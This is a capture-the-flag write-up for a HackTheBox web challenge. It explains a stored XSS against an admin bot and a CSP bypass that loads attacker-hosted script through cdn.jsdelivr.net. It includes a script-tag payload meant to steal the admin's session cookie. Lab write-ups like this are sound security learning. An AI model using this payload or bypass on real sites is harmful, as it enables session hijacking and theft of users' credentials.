---
title: Cursed Secret Party
published: 2025-09-09
description: A simple example of a Markdown blog post.
tags: [HackTheBox Challenge, Web]
category: HackTheBox
draft: false
---

We have a website submit infomation for party

<img width="1281" height="852" alt="image" src="https://github.com/user-attachments/assets/f6deae30-8004-4e42-9c83-80c94417a6a6" />

in file `route/index.js` define 4 route

`/` for render index
``` javascript
router.get('/', (req, res) => {
    return res.render('index.html');
});
```

`/api/submit` will post your input to server and store in database, then bot will run
``` javascript
router.post('/api/submit', (req, res) => {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name && email && costume_type && trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() => {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() => res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
```

`/admin` checking the role is admin, then get all request party are info you did send and render to `admin.html`
``` javascript
router.get('/admin', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }

    return db.get_party_requests()
        .then((data) => {
            res.render('admin.html', { requests: data });
        });
});
```

`/admin/delete_all` delete all request you send
``` javascript
router.get('/admin/delete_all', AuthMiddleware, (req, res) => {
    if (req.user.user_role !== 'admin') {
        return res.status(401).send(response('Unautorized!'));
    }
    
    return db.remove_requests()
            .then(() => res.send(response('All records are deleted!')));
})
```

In file bot.js, it will start browser in local, create token cookie with flag contain there. Then access to `/admin`, this will show all request you send. 
``` javascript
const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});

		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		setTimeout(() => {
			browser.close();
		}, 5000);

    } catch(e) {
        console.log(e);
    }
};
```

and admin.html will render your input. So, we can send script XSS to get cookie on feild `halloween_name`, bot will access `admin` to render your payload attachment token with flag
``` html
{{ request.halloween_name | safe }}
```

But CSP had block src other `self` and `https://cdn.jsdelivr.net`
```
"Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
```

Searching a little, i did find this blog [bypass csp jsdelivr](https://ian.nl/blog/bypass-csp-jsdelivr)
This CDN allow access to any source, also you can host your repo to this, very easy.

Step by step:
1. Create public repo with your payload xss
2. Host your repo with pattern `https://cdn.jsdelivr.net/gh/<user>/<repo>@<commit>/<path/to/file>`
3. Send payload via field `halloween_name`, ex: `<script src="https://cdn.jsdelivr.net/gh/cranix-ed/paylaod@5b45c259f58f4a8d75defb7b63089178d41c2bb0/exploit.js"></script>`
4. Resolve token and get flag

<img width="1477" height="439" alt="image" src="https://github.com/user-attachments/assets/54fd420d-a378-415a-ad13-d19368d50c73" />
